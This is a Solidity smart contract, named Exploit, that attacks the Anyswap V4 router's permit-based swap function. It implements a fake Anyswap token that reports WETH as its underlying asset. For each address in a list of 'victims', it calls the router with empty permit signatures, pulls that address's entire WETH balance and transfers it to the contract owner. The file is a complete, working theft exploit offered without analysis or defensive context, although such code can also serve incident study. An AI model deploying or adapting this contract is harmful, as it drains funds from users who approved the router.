//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

interface IAnyswapV4Router {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint toChainID
    ) external;
}

interface IAnyswapERC20 {
    function underlying() external view returns (address); 
    function depositVault(uint amount, address to) external returns (uint);
    function burn(address from, uint256 amount) external returns (bool);
}

interface IWETH {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
}

contract Exploit is IAnyswapERC20{

    address private immutable WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    IAnyswapV4Router private immutable anyswapRouter;
    
    address private immutable owner;
    constructor(address anyswapRouterAddr) {
        owner = msg.sender;
        anyswapRouter = IAnyswapV4Router(anyswapRouterAddr);    
    }

    function underlying() external override view returns (address) {
        return WETH;
    }

    function depositVault(uint, address) external override pure returns (uint) {
        return 0;
    }

    function burn(address, uint256) external override pure returns (bool) {
        return true;
    }

    function takeProfit() public {
        IWETH(WETH).transfer(owner, IWETH(WETH).balanceOf(address(this)));
    }

    function execute(address[] calldata victims) external {
        require(msg.sender == owner, "Oops !");
        for(uint i = 0; i < victims.length; i++) {
            anyswapRouter.anySwapOutUnderlyingWithPermit(
                victims[i],
                address(this),
                address(this),
                IWETH(WETH).balanceOf(victims[i]),
                block.timestamp + 1 days,
                uint8(0),
                bytes32(0),
                bytes32(0),
                56
            );
        }
        takeProfit();
    }
}